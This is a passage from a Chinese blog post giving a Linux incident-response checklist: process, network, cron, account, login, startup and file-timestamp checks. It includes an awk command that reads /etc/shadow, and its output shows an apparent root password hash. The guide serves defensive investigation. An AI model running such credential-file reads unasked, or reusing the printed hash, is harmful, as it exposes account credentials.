href="#ps-pgrep-模糊匹配-已知进程部分名称" class="headerlink" title="ps&#x2F;pgrep-模糊匹配-已知进程部分名称"></a>ps&#x2F;pgrep-模糊匹配-已知进程部分名称</h5><p>ps -ef | grep “process name” | grep -v grep | awk ‘{print $2}’</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">root@iZbp1191gh7vw52537lyxrZ:~# <span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;my&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><p>pgreap -f “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pgrep -f <span class="hljs-string">&quot;my&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="排查进程详细内容"><a href="#排查进程详细内容" class="headerlink" title="排查进程详细内容"></a>排查进程详细内容</h5><h6 id="lsof-p-pid"><a href="#lsof-p-pid" class="headerlink" title="lsof -p pid"></a>lsof -p pid</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# lsof -p <span class="hljs-number">659535</span><br><span class="hljs-attribute">COMMAND</span>    PID  USER   FD      TYPE             DEVICE SIZE/<span class="hljs-literal">OFF</span>      NODE NAME<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  cwd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>    <span class="hljs-number">138978</span> /var/lib/mysql<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  rtd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>         <span class="hljs-number">2</span> /<br><span class="hljs-attribute">81920</span>    <span class="hljs-number">267788</span> /var/lib/mysql/#innodb_temp/temp_10.ibt<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql   <span class="hljs-number">37</span>w      REG              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>      <span class="hljs-number">157</span>    <span class="hljs-number">138921</span> /var/lib/mysql/binlog.<span class="hljs-number">000244</span><br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动目录"><a href="#检查进程启动目录" class="headerlink" title="检查进程启动目录"></a>检查进程启动目录</h4><p>需要注意不一定是恶意文件目录</p><h5 id="pwdx-pid"><a href="#pwdx-pid" class="headerlink" title="pwdx pid"></a>pwdx pid</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># pwdx 659535</span><br><span class="hljs-number">659535</span>: <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql</span><br></code></pre></td></tr></table></figure><h4 id="检查进程实际启动文件"><a href="#检查进程实际启动文件" class="headerlink" title="检查进程实际启动文件"></a>检查进程实际启动文件</h4><p>查看到对应进程可执行文件的绝对路径</p><h5 id="ls-lat-proc-pid-exe"><a href="#ls-lat-proc-pid-exe" class="headerlink" title="ls -lat &#x2F;proc&#x2F;pid&#x2F;exe"></a>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">11</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h4 id="检查进程关联文件"><a href="#检查进程关联文件" class="headerlink" title="检查进程关联文件"></a>检查进程关联文件</h4><h5 id="cat-proc-pid-maps"><a href="#cat-proc-pid-maps" class="headerlink" title="cat &#x2F;proc&#x2F;pid&#x2F;maps"></a>cat &#x2F;proc&#x2F;pid&#x2F;maps</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# cat /proc/<span class="hljs-number">659535</span>/maps<br><span class="hljs-attribute">55f8c0537000</span>-<span class="hljs-number">55</span>f8c0df4000 r--p <span class="hljs-number">00000000</span> fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">55f8c0df4000</span>-<span class="hljs-number">55</span>f8c2549000 r-xp <span class="hljs-number">008</span>bd000 fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动的所有线程"><a href="#检查进程启动的所有线程" class="headerlink" title="检查进程启动的所有线程"></a>检查进程启动的所有线程</h4><h5 id="ps-H-T-p-pid"><a href="#ps-H-T-p-pid" class="headerlink" title="ps H -T -p pid"></a>ps H -T -p pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps H -T -p <span class="hljs-number">659535</span><br>    <span class="hljs-attribute">PID</span>    SPID TTY      STAT   TIME COMMAND<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659535</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659538</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><p>SPID：线程ID </p><p>COMMAND：线程名称</p><h5 id="ps-Lf-pid"><a href="#ps-Lf-pid" class="headerlink" title="ps -Lf pid"></a>ps -Lf pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -Lf <span class="hljs-number">659535</span><br><span class="hljs-attribute">UID</span>          PID    PPID     LWP  C NLWP STIME TTY      STAT   TIME CMD<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659535</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659538</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="排查异常网络连接"><a href="#排查异常网络连接" class="headerlink" title="排查异常网络连接"></a>排查异常网络连接</h3><h4 id="netstat-anlp-grep-ESTABLISHED"><a href="#netstat-anlp-grep-ESTABLISHED" class="headerlink" title="netstat -anlp | grep ESTABLISHED"></a>netstat -anlp | grep ESTABLISHED</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# netstat -anlp | grep ESTABLISHED<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">172.16.24.136:51856</span>     <span class="hljs-number">100.100.30.28:80</span>        ESTABLISHED <span class="hljs-number">442626</span>/AliYunDun<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">80</span> <span class="hljs-number">172.16.24.136:22</span>        <span class="hljs-number">218.30.113.52:1642</span>      ESTABLISHED <span class="hljs-number">671506</span>/sshd: root@p<br></code></pre></td></tr></table></figure><h4 id="netstat-anlp-grep-LISTEN"><a href="#netstat-anlp-grep-LISTEN" class="headerlink" title="netstat -anlp | grep LISTEN"></a>netstat -anlp | grep LISTEN</h4><p>检查设备监听情况，排查是否存在高危端口、是否存在监听0.0.0.0</p><h3 id="排查异常定时任务"><a href="#排查异常定时任务" class="headerlink" title="排查异常定时任务"></a>排查异常定时任务</h3><h4 id="检查系统定时任务-etc-crontab"><a href="#检查系统定时任务-etc-crontab" class="headerlink" title="检查系统定时任务&#x2F;etc&#x2F;crontab"></a>检查系统定时任务&#x2F;etc&#x2F;crontab</h4><h5 id="cat-etc-crontab"><a href="#cat-etc-crontab" class="headerlink" title="cat &#x2F;etc&#x2F;crontab"></a>cat &#x2F;etc&#x2F;crontab</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># cat /etc/crontab</span><br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br><span class="hljs-comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 ** * *root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6* * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6* * 7root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 61 * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><h4 id="检查各用户定时任务-var-spool-cron"><a href="#检查各用户定时任务-var-spool-cron" class="headerlink" title="检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron"></a>检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron</h4><h5 id="cat-var-spool-cron-username"><a href="#cat-var-spool-cron-username" class="headerlink" title="cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username"></a>cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># ls -lat /var/spool/cron/</span><br>总用量 12<br>drwx------. <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>3月 <span class="hljs-number"> 12 </span>17:20 .<br>-rw-------  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 19 </span>3月 <span class="hljs-number"> 12 </span>17:20 root<br>drwxr-xr-x.<span class="hljs-number"> 11 </span>root root<span class="hljs-number"> 4096 </span>8月 <span class="hljs-number"> 18 </span>2023 ..<br><br><br>(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># cat /var/spool/cron/root</span><br>* * * * * echo 111<br>您在 /var/spool/mail/root 中有新邮件<br></code></pre></td></tr></table></figure><h5 id="检查当前用户定时任务-crontab-l"><a href="#检查当前用户定时任务-crontab-l" class="headerlink" title="检查当前用户定时任务 crontab -l"></a>检查当前用户定时任务 crontab -l</h5><p>读取&#x2F;var&#x2F;spool&#x2F;cron目录下对应用户的记录</p><h5 id="检查对于用户的定时任务-crontab-u-name-l"><a href="#检查对于用户的定时任务-crontab-u-name-l" class="headerlink" title="检查对于用户的定时任务 crontab -u name -l"></a>检查对于用户的定时任务 crontab -u name -l</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span>-x cron]<span class="hljs-meta"># crontab -u root -l</span><br>* * * * * echo <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><h4 id="需要关注的定时任务目录及文件"><a href="#需要关注的定时任务目录及文件" class="headerlink" title="需要关注的定时任务目录及文件"></a>需要关注的定时任务目录及文件</h4><h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.hourly<br><span class="hljs-regexp">/etc/</span>cron.daily<br><span class="hljs-regexp">/etc/</span>cron.weekly<br><span class="hljs-regexp">/etc/</span>cron.monthly<br><span class="hljs-regexp">/etc/</span>anacrontab<br></code></pre></td></tr></table></figure><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br></code></pre></td></tr></table></figure><h3 id="排查异常用户"><a href="#排查异常用户" class="headerlink" title="排查异常用户"></a>排查异常用户</h3><h4 id="检查特权账号"><a href="#检查特权账号" class="headerlink" title="检查特权账号"></a>检查特权账号</h4><h5 id="awk-F-‘-3-0-print-1-’-etc-passwd"><a href="#awk-F-‘-3-0-print-1-’-etc-passwd" class="headerlink" title="awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd"></a>awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd</h5><p>默认情况下，只有root用户是特权用户</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">root<span class="hljs-meta">@iZbp</span>1191gh7vw52537lyxrZ:/# awk -F: <span class="hljs-string">&#x27;<span class="hljs-subst">$3</span>==0 &#123;print <span class="hljs-subst">$1</span>&#125;&#x27;</span> /etc/passwd<br>root<br></code></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;passwd文件 以 : 分割字符，当第三个字符为0时，输出第一个字符</p><h4 id="检查可登录账号"><a href="#检查可登录账号" class="headerlink" title="检查可登录账号"></a>检查可登录账号</h4><p>查看存在密码账户，也就是可能会登录的账户</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">awk <span class="hljs-string">&#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$5</span>|\<span class="hljs-variable">$6</span>/ &#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/shadow<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span>:<span class="hljs-regexp">/# awk &#x27;/</span>\<span class="hljs-variable">$1</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$5</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$6</span><span class="hljs-operator">/</span> &#123;print <span class="hljs-variable">$1</span>&#125;&#x27; <span class="hljs-regexp">/etc/</span>shadow<br>root:<span class="hljs-variable">$6</span><span class="hljs-variable">$OFsjgtZl</span><span class="hljs-variable">$ng76xjs7xQZH0asW6h1RGwXSSD6nD5sIJF163Etabm8ydItXJiD0T8KRBPwmcUdG</span><span class="hljs-operator">/</span><span class="hljs-type">WDlckAtnlQOmaYVnDPis</span>.:<span class="hljs-number">19548</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure><p>读取 &#x2F;etc&#x2F;shadow 文件，匹配包含 $1 $5 $6 任意一个的字符串</p><h3 id="排查异常登录"><a href="#排查异常登录" class="headerlink" title="排查异常登录"></a>排查异常登录</h3><p>检查&#x2F;var&#x2F;run&#x2F;utmp，&#x2F;var&#x2F;log&#x2F;wtmp 中的记录</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>查看当前登录用户信息用户名、登录方式（tty：本地登录、pst：远程登录）、登录时间、登录IP</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p><h4 id="w"><a href="#w" class="headerlink" title="w"></a>w</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w</span><br> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">13</span>:<span class="hljs-number">20</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">35</span>   <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">7.00s</span>  <span class="hljs-number">0.02s</span>  <span class="hljs-number">0.00s</span> w<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;proc</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>输出历史登录成功用户</p><h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>输出历史登录用户，包含登录成功和失败</p><h3 id="排查异常开机启动"><a href="#排查异常开机启动" class="headerlink" title="排查异常开机启动"></a>排查异常开机启动</h3><h4 id="开机启动目录-etc-init-d"><a href="#开机启动目录-etc-init-d" class="headerlink" title="开机启动目录&#x2F;etc&#x2F;init.d&#x2F;"></a>开机启动目录&#x2F;etc&#x2F;init.d&#x2F;</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/init.d/</span><br>total 184<br>drwxr-xr-x<span class="hljs-number"> 116 </span>root root<span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 2 </span>06:03 ..<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 5 </span>17:08 .<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5607 </span>Jun<span class="hljs-number"> 15 </span><span class="hljs-number"> 2023 </span>mysql<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4579 </span>May<span class="hljs-number"> 31 </span><span class="hljs-number"> 2023 </span>nginx<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 985 </span>Dec <span class="hljs-number"> 2 </span><span class="hljs-number"> 2022 </span>grub-common<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2915 </span>May<span class="hljs-number"> 10 </span><span class="hljs-number"> 2022 </span>apport<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 6871 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2022 </span>udev<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4060 </span>Feb<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>ssh<br></code></pre></td></tr></table></figure><h3 id="排查异常文件"><a href="#排查异常文件" class="headerlink" title="排查异常文件"></a>排查异常文件</h3><p>检查文件内容使用 cat 命令，不会修改文件时间属性，如果使用vim，可能会修改文件时间属性</p><h4 id="文件时间检查"><a href="#文件时间检查" class="headerlink" title="文件时间检查"></a>文件时间检查</h4><p><strong>stat filename 查看文件时间，change&#x2F;最近改动是文件落盘时间</strong></p><p>示例：</p><p>原始文件时间信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <br></code></pre></td></tr></table></figure><p>vim文件wq退出，修改文件modify和change时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# vim <span class="hljs-number">11</span>.txt<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">790640177</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>chmod改变文件属性，会修改Change时间</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span 